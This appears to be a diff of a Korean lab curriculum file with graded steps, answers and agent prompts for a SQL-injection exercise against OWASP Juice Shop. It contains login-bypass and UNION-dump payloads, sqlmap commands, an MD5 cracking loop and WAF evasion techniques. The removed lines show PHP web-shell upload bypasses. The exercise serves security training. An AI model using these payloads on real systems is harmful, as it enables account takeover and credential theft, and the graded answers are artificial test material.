+      intent: WAF SQLi 탐지 패턴 분석 — ModSecurity OWASP CRS 룰·정규식·시그니처 탐지와 우회 기법
+      success_criteria:
+      - CRS 룰 파일 위치 또는 대표 룰(942100 등) 언급
+      - 우회 기법 3개(인라인 주석, 대소문자 변조, URL 인코딩, Unicode) 중 2개 이상
+      - WAF 한계(긍정 오탐·대역폭)·보완 방어 언급
+      acceptable_methods:
+      - ModSecurity + CRS 설치·룰 확인
+      - AWS WAF SqlInjectionMatchSet
+      - Cloudflare WAF SQLi rule ID
+      - wafw00f 로 WAF 종류 탐지
+      negative_signs:
+      - WAF 사용만 언급
+      - 우회 기법 없음
+      - 오탐 관점 누락
+  target_vm: attacker
+  script: 'echo -e ''=== WAF SQLi 탐지 패턴 ===
+
+    1. UNION SELECT
+
+    2. OR 1=1
+
+    3. 주석 처리(-- , #, /**/)
+
+    4. 특수 함수(SLEEP, BENCHMARK)
+
+    5. 인코딩 우회(URL, Hex, Unicode)
+
+    WAF 패턴 분석 완료'''
+  risk_level: low
+  bastion_prompt: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
 
 
     [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
     curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+# ============================================================
+# STEP 14 [RED·SQLi·Post-Exploit] — MD5 hash crack + bcrypt/argon2 권장
+# ============================================================
+- order: 14
+  instruction: |
+    ## 🎯 MISSION
+
+    STEP 5 에서 추출한 admin@juice-sh.op MD5 hash `0192023a7bbd73250516f069df18b500`
+    의 cracking. (1) 길이 32 hex = MD5 식별 (2) weak password 후보 직접 매칭
+    (3) hashcat dictionary attack 의 시도 (4) bcrypt/argon2 권장.
+
+    ## 💻 실행 명령
+
+    ```bash
+    HASH="0192023a7bbd73250516f069df18b500"
+    echo "hash: ${HASH} (length=${#HASH} → MD5)"
+
+    # weak password 후보 직접 매칭
+    echo "=== weak password 직접 매칭 ==="
+    for pw in "admin" "admin123" "password" "123456" "letmein" "qwerty"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "  ★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo ""
+    echo "운영 = bcrypt(12)/argon2 + password policy + MFA + rate-limit"
+    echo "해시 분석 완료"
+    ```
+
+    ## 📋 확인 사항
+
+    - 32 hex = MD5 식별 (60 = bcrypt, 64 = SHA256)
+    - admin123 → 0192023a7bbd73250516f069df18b500 (★ MATCH)
+    - 실 wordlist (rockyou.txt) + hashcat 의 즉시 cracking
+
+    ## 💡 왜 이걸 하는가?
+
+    SQLi 로 추출한 hash 의 crackability = credential stuffing (MITRE T1110.004)
+    의 직접 입력. MD5 + weak password = 1 초 cracking. 운영 web 의 적절한
+    hash = bcrypt(12) 또는 argon2id.
+
+    ## 🔵 Blue 작업
+
+    - 정기 password audit (DB sample → hash 형식 식별)
+    - HIBP API 로 leaked password 강제 재설정 alert
+
+    ## 🟣 Purple 권고
+
+    - bcrypt(12) 또는 argon2id 강제 (MD5 deprecate)
+    - password policy 12자 + 복잡도 + HIBP API 검증
+    - MFA 의무 + rate-limit + Juice Shop default admin123 제거
+  hint: |
+    32 자 hex = MD5. admin123 의 MD5 = 0192023a7bbd73250516f069df18b500.
+  category: post_exploit
+  points: 10
+  answer: |
+    HASH="0192023a7bbd73250516f069df18b500"
+    echo "hash: ${HASH} (length=${#HASH} → MD5)"
+    for pw in "admin" "admin123" "password" "123456" "letmein"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo "해시 분석 완료 — 운영 = bcrypt(12)/argon2"
+  answer_detail: |
+    admin@juice-sh.op MD5(admin123) = 0192023a7bbd73250516f069df18b500. 직접
+    매칭 으로 즉시 발견. 운영 = bcrypt(12) 또는 argon2id + password policy +
+    MFA + rate-limit 의 다층 방어.
+  verify:
+    type: output_contains
+    expect: 'MATCH'
+    field: stdout
+    semantic:
+      intent: |
+        추출 hash crackability 평가 — MD5 식별 + 직접 매칭 + bcrypt/argon2 권장.
+        MITRE T1110.004 + OWASP A02.
+      success_criteria:
+        - 길이 32 hex = MD5 식별
+        - 직접 매칭 또는 hashcat 으로 admin123 발견
+        - bcrypt 또는 argon2 권장
+      acceptable_methods:
+        - "md5sum 직접 매칭"
+        - "hashcat -m 0 -a 0 wordlist"
+        - "john --format=raw-md5"
+      negative_signs:
+        - 매칭 시도 없음
+        - bcrypt 권장 누락
+  target_vm: attacker
+  script: |
+    HASH="0192023a7bbd73250516f069df18b500"
+    for pw in "admin" "admin123" "password" "123456"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo "해시 분석 완료"
+  risk_level: low
+  bastion_prompt: |
+    admin@juice-sh.op MD5 hash 0192023a7bbd73250516f069df18b500 의 cracking —
+    (1) 길이 32 hex = MD5 (2) weak password 후보 (admin/admin123/password/등)
+    직접 md5sum 매칭 → admin123 발견 (3) bcrypt(12)/argon2id 권장.
+# ============================================================
+# STEP 15 [PURPLE·SQLi·보고서] — STEP 1-14 종합 markdown 보고서
+# ============================================================
 - order: 15
-  instruction: '파일 업로드 취약점 실습 종합 보고서를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1-14 의 SQLi 정찰 + 추출 + post-exploit 결과를 종합한 markdown
+    보고서를 /tmp/w02_sqli_report.md 에 작성. 5 종 취약점 + Critical PoC +
+    5 단 방어 + 윤리 진술.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
-    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQL Injection Report — Juice Shop @ juice.6v6.lab
+
+    ## 1. 발견 취약점 (5 종)
+
+    | # | 분류 | endpoint | PoC | 위험도 |
+    |---|------|---------|-----|--------|
+    | V1 | SQLi 탐지 | /rest/products/search?q=apple' | SQL 에러 노출 | Low |
+    | V2 | Error-based | UNION SELECT sqlite_version() | DB version 노출 | Medium |
+    | V3 | Auth Bypass | POST /rest/user/login email=admin@juice-sh.op'-- | admin JWT | Critical |
+    | V4 | UNION dump | qwert')) UNION SELECT email,password FROM Users | 21 user MD5 | Critical |
+    | V5 | Weak hash | MD5(admin123) = 0192023a... | 1초 crack | Critical |
+
+    ## 2. Critical PoC 인용
+
+    ### V3 — Authentication Bypass
+    ```bash
+    curl -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}"
+    # → JWT payload role:"admin"
+    ```
+
+    ## 3. 5 단 방어 (defense in depth)
+
+    1. Prepared Statement (Sequelize replacements)
+    2. ORM where 객체 (raw query 금지)
+    3. Input Validation (express-validator)
+    4. WAF (ModSec PARANOIA 2-3, default DetectionOnly → On)
+    5. bcrypt(12)/argon2id (MD5 즉시 deprecate)
+
+    ## 4. 윤리·법적 진술
+
+    OWASP Juice Shop (학습용 의도 vuln) + 학습 환경 juice.6v6.lab 만 대상.
+    정보통신망법 제48조 — 허가 범위 내 적용 제외. 보고서 + transcript 24개월.
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -25 $REPORT
+    ```
+
+    ## 📋 확인 사항
+
+    - 보고서 파일 /tmp/w02_sqli_report.md 생성 (ls -la 확인)
+    - 5 종 취약점 표 + Critical PoC + 5 단 방어 + 윤리 진술 4 항목
+
+    ## 💡 학습 의의
+
+    *client 산출물 양식* — STEP 1-14 raw 데이터를 위험도 + 방어 권고로 정리.
+    *해킹 ≠ 점검* = 보고서 + 윤리 진술.
+
+    ## 🟣 Purple 권고
+
+    1. 즉시: Sequelize raw query review + ORM where 강제 (V3/V4)
+    2. 1주: bcrypt(12) 강제 + MD5 hash 재설정 (V5)
+    3. 1개월: ModSec PARANOIA 2 → 3 단계 (V1/V2)
+    4. 3개월: SAST (Snyk) + DAST (sqlmap CI)
+  hint: |
+    cat > FILE <<'EOF' heredoc markdown — 5 종 취약점 표 + Critical PoC +
+    5 단 방어 + 윤리. ls -la + head 검증.
   category: verification
   points: 8
-  answer: '🤖 프롬프트: 파일 업로드 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQLi Report — Juice Shop @ juice.6v6.lab
 
-    📎 참고 (CLI): echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80''
-    && echo ''=== 보고서 완료 ==='''
-  answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | SQLi 탐지 | q=apple' SQL 에러 | Low |
+    | V2 | Error-based | UNION SELECT sqlite_version() | Medium |
+    | V3 | Auth Bypass | admin@juice-sh.op'-- JWT | Critical |
+    | V4 | UNION dump | email/password 21 user | Critical |
+    | V5 | Weak hash | MD5(admin123) 1초 crack | Critical |
+
+    방어 = Sequelize where + bcrypt(12) + ModSec PARANOIA 2-3 + SAST/DAST CI
+    윤리 = OWASP Juice Shop 학습용 + 정보통신망법 제48조 적용 제외
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -20 $REPORT
+  answer_detail: |
+    W02 SQLi 종합 보고서 — 5 종 (V1-V5) + Critical 3 (V3/V4/V5) + 5 단 방어 +
+    윤리 진술. STEP 1-14 raw 데이터의 client deliverable 변환.
   verify:
     type: output_contains
-    expect: 보고서 완료
+    expect: '보고서 생성 완료'
     field: stdout
     semantic:
-      intent: 파일 업로드 취약점 종합 리포트 — 엔드포인트/우회 기법/웹쉘 실행/권한/방어를 /tmp/upload_report.txt
+      intent: |
+        STEP 1-14 SQLi 종합 markdown 보고서 — 5 종 취약점 + Critical PoC +
+        5 단 방어 + 윤리. client deliverable 표준.
       success_criteria:
-      - 4 섹션 이상 (탐지/Exploit/Execute/방어)
-      - 업로드 경로·PoC payload 포함
-      - 파일 저장 후 cat 확인
+        - 보고서 파일 생성 (ls -la)
+        - 5 종 취약점 + 위험도 표
+        - Critical PoC 인용 (V3 또는 V4 또는 V5)
+        - 5 단 방어 또는 defense in depth 권고
       acceptable_methods:
-      - heredoc markdown
-      - echo -e 다줄
-      - json/yaml 구조
-      - python template
+        - "cat > FILE <<EOF heredoc"
+        - "python jinja2"
       negative_signs:
-      - 섹션 2 미만
-      - PoC 없음
-      - 파일 저장 없음
+        - 파일 미생성
+        - 표/PoC 누락
   target_vm: attacker
-  script: 'echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
-    echo ''=== 보고서 완료 ==='''
+  script: |
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQLi Report
+    V3 Auth Bypass / V4 UNION dump / V5 MD5(admin123) — Critical 3
+    방어 = Sequelize where + bcrypt(12) + ModSec PARANOIA
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
   risk_level: low
-  bastion_prompt: '파일 업로드 취약점 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
-    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    STEP 1-14 SQLi 결과 종합 markdown 보고서 /tmp/w02_sqli_report.md 작성 —
+    5 종 취약점 표 (V1-V5) + Critical 3 (V3 Auth Bypass / V4 UNION dump /
+    V5 MD5 crack) PoC 인용 + 5 단 방어 (Sequelize/bcrypt/ModSec/SAST/DAST) +
+    윤리 진술. ls -la + head 검증 출력.
 - order: 99
-  instruction: '[복합 시나리오] "input validation 실패 비교 — SQLi (컬럼 입력) vs Upload (파일/MIME)"
+  instruction: '[복합 시나리오] "JuiceShop SQLi 점검 — 도구 3종 비교 + 비교 보고서"
 
 
-    ■ 상황 (w04 → w05 시나리오 연속)
+    ■ 상황 (w01 → w02 시나리오 연속)
 
 
-    w04 에서 인증·세션 매트릭스까지 마쳤다. 이번 주는 입력값 검증.
+    당신은 ABC 핀테크 점검팀 신규 컨설턴트. w01 에서 OWASP WSTG-INFO 정찰까지 마쳤고,
+
+    이제 SQLi 점검 단계에 들어왔다. 선배가 한 마디 던진다.
 
 
-    ※ 선배: "SQLi 랑 파일 업로드는 다른 취약점처럼 보이지만 같은 실패야 — 입력값 검증 누락.
+    ※ 선배: "신입은 sqlmap 한 줄 돌리고 끝내는데, 우리는 그렇게 못 해.
 
-    ※ SQLi 는 컬럼 값을 그대로 쿼리에 박은 거고, 업로드는 파일명·MIME 을 그대로 믿은 거지.
+    ※ 자동 도구는 빠르지만 우회 룰이 박힌 사이트에선 절반은 놓쳐.
 
-    ※ 두 취약점 동시 점검해서 ''입력 위치 × validation 종류'' 매트릭스 만들어. 공통 방어 원칙도 정리하고."
+    ※ 수동 curl 은 정확하지만 느려. ZAP 프록시는 흐름 캡처에 강하고.
+
+    ※ 세 도구 다 돌려보고 각자 강·약점이 뭔지 표로 만들어 와. 보고서에 쓸 거야."
 
 
-    학습 목표 (lecture #2 SQLi 유형 + #4 sqlmap) + (lab #3 확장자 + #4 Content-Type + #5 Magic
-    bytes) 통합.
+    학습 목표 #1 (도구 차이 이해) + #3 (직접 설치·실행) + #4 (curl 고급) 행동 증명.
 
 
     ■ 임무 (3 단계, 약 35분)
 
 
-    ▶ Phase A — SQLi validation 실패 (lecture #2·#3·#4)
+    ▶ Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)
 
-    `sqlmap -u "http://10.20.32.80/rest/products/search?q=test" --batch --technique=BT
-    --level=2` 로
+    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://juice.6v6.lab/rest/user/login`
+    형태로
 
-    Boolean·Time-based 자동 탐지. response time 차이 (>5초) 가 Time-based 증거. sqlmap 출력의
-
-    "[INFO] heuristic ... appears to be vulnerable" 라인 캡처.
+    1=1 인증 우회를 직접 쏴 본다. -i (헤더), -X POST, --data-urlencode 옵션 시연. 응답 status·body 캡처.
 
 
-    ▶ Phase B — Upload validation 실패 3 케이스 (lab #3·#4·#5)
+    ▶ Phase B — sqlmap 자동 탐지 (학습 목표 #3 — 직접 실행)
 
-    JuiceShop 의 `/api/Complaints/` 또는 `/file-upload` 대상 (실제 환경이 다르면 가상 URL 로 대체).
+    `sqlmap -u "http://juice.6v6.lab/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs` 로
 
-    - 확장자 우회: shell.php.jpg / shell.pHp / shell.php%00.jpg 3개 파일명 시도
-
-    - Content-Type 변조: `curl -F "file=@shell.php;type=image/jpeg"` 헤더 위조
-
-    - Magic bytes: `printf ''\xff\xd8\xff\xe0<?php phpinfo(); ?>'' > shell.php` JPEG
-    header + PHP code
+    DB 목록 추출. tables → dump 단계는 시간 비교용으로 첫 페이지만 실행, 소요시간 기록.
 
 
-    ▶ Phase C — "입력 위치 × validation 종류" 매트릭스 + 공통 원칙
+    ▶ Phase C — 3 도구 비교표 + 권장 흐름
 
-    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
+    | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
 
-    | URL/Body 컬럼 | SQLi (1=1, '' OR) | Prepared Statement | parameterized query |
+    | 탐지 정확도 / 소요시간 / FP / 우회 능력 / 학습 곡선 | ... | ... | ... |
 
-    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
-
-    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
-
-    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
-
-    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.
+    표 아래에 "1차 정찰: ZAP → 2차 자동: sqlmap → 3차 검증: curl" 식 권장 흐름 1~2줄.
 
 
-    종료: echo "=== Phase A SQLi ===" / "=== Phase B Upload 3 케이스 ===" / "=== Phase
-    C 매트릭스 ===" 묶음.
+    종료 정리: 각 phase 의 핵심 출력 (curl status·sqlmap DB·비교표) 를 한 번에 echo 로 묶어 출력.
 
 
 
     [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
     정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
     답변에 직접 quote** 해야 채점 통과.'
-  bastion_prompt: '[복합 시나리오 — w05 input validation 비교]
+  bastion_prompt: '[복합 시나리오 — w02 SQLi 점검 도구 3종 비교]
 
 
-    SQLi 와 파일 업로드 두 취약점을 같은 "input validation 실패" 관점에서 점검. 3 phase.
+    당신은 ABC 핀테크 점검 컨설턴트. JuiceShop (http://juice.6v6.lab) 대상 SQLi 점검을
+
+    curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 점검해라. 다음 3 phase 를 순서대로 실행:
 
 
-    Phase A (SQLi):
+    Phase A (curl 수동, 학습 목표 #4):
 
-    `sqlmap -u "http://10.20.32.80/rest/products/search?q=test" --batch --technique=BT
-    --level=2 --timeout=20`
+    `curl -s -i -X POST --data-urlencode "email=admin'' OR 1=1--" --data-urlencode
+    "password=x"
 
-    실행. Boolean·Time-based 결과 + "[INFO] ... appears to be vulnerable" 라인 캡처.
-
-
-    Phase B (Upload 3 케이스):
-
-    실제 업로드 엔드포인트가 정확하지 않으면 *PoC 명령어만 출력* 해도 OK.
-
-    - 확장자: `for ext in php.jpg pHp ''php%00.jpg''; do curl -F "file=@/tmp/shell.$ext"
-    http://10.20.32.80/api/Complaints/file; done`
-
-    - Content-Type: `curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.32.80/api/Complaints/file`
-
-    - Magic bytes: `printf ''\xff\xd8\xff\xe0<?php phpinfo(); ?>'' > /tmp/shell.php`
-    후 위 curl
+    http://juice.6v6.lab/rest/user/login` 실행 후 status code 와 응답 body 첫 줄 캡처.
 
 
-    Phase C (매트릭스):
+    Phase B (sqlmap 자동, 학습 목표 #3):
 
-    ```
+    `sqlmap -u "http://juice.6v6.lab/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs`
 
-    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
+    실행. DB 목록 + 소요시간 (sqlmap 출력 끝의 [INFO] elapsed) 기록.
 
-    | URL/Body 컬럼 | SQLi (1=1, '' OR) | Prepared Statement | parameterized query |
 
-    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
+    Phase C (비교표 + 권장 흐름):
 
-    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
-
-    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
+    아래 형식으로 비교표 출력:
 
     ```
 
-    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.
+    | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
+
+    | 탐지정확도 | 높음 | 중 | 중 |
+
+    | 소요시간 | ... | ... | ... |
+
+    | FP | 낮음 | 중 | 낮음 |
+
+    | 우회능력 | 높음 | 중 | 중 |
+
+    ```
+
+    표 끝에 "권장 흐름: ZAP 정찰 → sqlmap 자동 → curl 검증" 한 줄.
 
 
-    종료: echo 묶음 "=== Phase A SQLi ===" / "=== Phase B Upload ===" / "=== Phase C 매트릭스
-    ===".
+    종료: echo 로 "=== Phase A status ===" / "=== Phase B DB list ===" / "=== Phase C
+    비교표 ===" 묶어 출력.
 
 
-    반드시 3 phase 모두 실행. 중간 종료 금지.
+    반드시 위 3 phase 모두 실행 후 마무리. 중간 종료 금지.
 
 
     [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
     → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
     → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
-  hint: 'Phase A: --technique=BT 가 Boolean+Time. --timeout 20초 정도 권장.
+  hint: 'Phase A: curl -i 로 status header 함께 출력. --data-urlencode 가 % 인코딩 자동.
 
-    Phase B: 업로드 엔드포인트가 환경마다 다름. 명령어만 출력해도 OK.
+    Phase B: --batch 는 모든 prompt 자동 yes. --dbs 만 첫 단계. tables/dump 는 추가 옵션.
 
-    Phase C: 4행 매트릭스. 공통 원칙 한 줄.
+    Phase C: 비교표는 4개 항목 정도면 충분. 권장 흐름 한 줄로 마무리.
 
-    포인트: SQLi 와 업로드는 *같은 원리* — 입력값을 그대로 믿는 실패.
+    포인트: sqlmap "한 줄로 끝" 이 아니라, 도구마다 강약이 다르다는 점을 표로 시연.
+
+    종료: 3 phase 출력을 echo 묶음으로 한 화면에.
 
     '
   category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: 매트릭스
+    expect: 비교표
     field: stdout
     semantic:
-      intent: 'SQLi 와 파일 업로드를 "input validation 실패" 동일 관점에서 점검 + 입력 위치 × validation
-        매트릭스.
+      intent: 'JuiceShop SQLi 점검을 curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 실행하고,
 
-        lecture #2·#3·#4 + lab #3·#4·#5 동시 행동 증명.
+        도구별 강약점 비교표 + 권장 점검 흐름까지 작성. 학습 목표 #1 (도구 차이) + #3 (직접 실행) +
+
+        #4 (curl 고급) 동시 행동 증명.
 
         '
       success_criteria:
-      - Phase A — sqlmap Boolean·Time-based 탐지, vulnerable 라인 캡처
-      - Phase B — 확장자 / Content-Type / Magic bytes 3 우회 시도 (또는 PoC 명령어)
-      - Phase C — 4행 매트릭스 + 공통 원칙 한 줄
+      - Phase A — curl 로 1=1 인증 우회 페이로드 직접 전송, status·body 캡처
+      - Phase B — sqlmap --batch --dbs 로 DB 목록 추출, 소요시간 기록
+      - Phase C — 3 도구 비교표 (4 항목 이상) + 권장 흐름 1~2줄
       acceptable_methods:
-      - sqlmap --technique=BT
-      - curl -F 로 업로드 우회
-      - printf magic bytes 생성
-      - markdown table 매트릭스
-      - 실 업로드 실패 시 PoC 명령어 출력 대체
+      - curl -i / -X POST / --data-urlencode 로 SQLi payload
+      - sqlmap --batch --level --risk --dbs
+      - ZAP 자동 스캔 결과 캡처 또는 도구 설명으로 대체 (실 실행 어려우면 비교표만)
+      - markdown table 또는 ASCII table 형식 비교표
       negative_signs:
-      - SQLi 만 또는 업로드 만 단발 점검
-      - 매트릭스 누락
-      - 공통 원칙 누락
-      - allowlist 권고 누락
+      - sqlmap 한 도구만 실행하고 종료
+      - 비교표 없이 결과만 나열
+      - curl 페이로드를 텍스트 설명만 하고 실행 안 함
+      - 권장 흐름 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 위 bastion_prompt 그대로. sqlmap → curl 업로드 PoC → 매트릭스.
+  answer: '🤖 위 bastion_prompt 그대로 입력. Bastion 이 curl 직접 실행 → sqlmap --batch 실행 → 비교표
+    작성
+
+    3 phase 순차 처리.
 
     '
-  answer_detail: 'SQLi 와 업로드는 표면이 다르지만 모두 "입력값을 그대로 믿음" 실패. allowlist > blocklist
-    가 공통 원칙.
+  answer_detail: '학습 목표 #1·#3·#4 통합 검증. sqlmap 한 줄로 끝내는 신입 패턴이 아닌, 도구별 강약점을 표로 정리할
+    수
 
-    Magic bytes 는 JPEG (\\xff\\xd8\\xff\\xe0) + PHP 코드 결합 PoC. 실제 업로드 환경이 변동이면 명령어
-    출력.
+    있는지 확인. ZAP 은 GUI 라 자동 환경에서는 설명 대체 허용, curl·sqlmap 은 실행 강제. 비교표는
+
+    탐지정확도·소요시간·FP·우회능력 4 축 권장.
 
     '
   script: ''
